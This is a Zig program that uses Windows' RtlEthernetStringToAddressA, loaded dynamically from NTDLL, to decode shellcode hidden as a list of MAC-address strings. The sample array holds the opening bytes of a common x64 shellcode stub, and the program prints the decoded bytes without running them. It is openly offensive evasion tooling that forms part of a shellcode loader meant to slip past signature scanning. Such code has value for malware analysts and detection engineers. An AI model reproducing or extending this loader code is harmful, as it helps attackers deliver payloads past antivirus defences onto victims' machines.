const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlEthernetStringToAddressA
const fnRtlEthernetStringToAddressA = fn (
    S: PCSTR,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of MAC addresses into a byte buffer
pub fn macDeobfuscation(
    macArray: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlEthernetStringToAddressA function
    const rtlEthernetStringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlEthernetStringToAddressA");
    if (rtlEthernetStringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlEthernetStringToAddressA: *const fnRtlEthernetStringToAddressA = @ptrCast(rtlEthernetStringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of MAC addresses * 6 bytes each)
    const bufferSize = macArray.len * 6; // MAC addresses are 6 bytes each

    // Allocate memory for the deobfuscated shellcode
    const buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Using a raw pointer to keep track of our current position
    var tmpBuffer: [*]u8 = buffer.ptr;

    // Deobfuscate each MAC address
    for (macArray) |macAddress| {
        var terminator: PCSTR = undefined;

        // Convert the MAC address string to bytes
        const status = rtlEthernetStringToAddressA(macAddress, &terminator, tmpBuffer);

        // Check if the status is not SUCCESS (0)
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlEthernetStringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ macAddress, @intFromEnum(status) });
            return error.RtlEthernetStringToAddressFailed;
        }

        // Increment tmpBuffer by 6 bytes for the next address
        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 6));
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of MAC addresses (shellcode encoded as MAC)
    const mac_array = [_][*:0]const u8{ "FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72", "50-48-0F-B7-4A-4A" };
    std.debug.print("[+] Attempting to deobfuscate {} MAC addresses\n", .{mac_array.len});

    // Call the deobfuscation function
    const result = try macDeobfuscation(&mac_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Print all bytes
    std.debug.print("[+] Deobfuscated bytes: ", .{});
    for (result.buffer) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
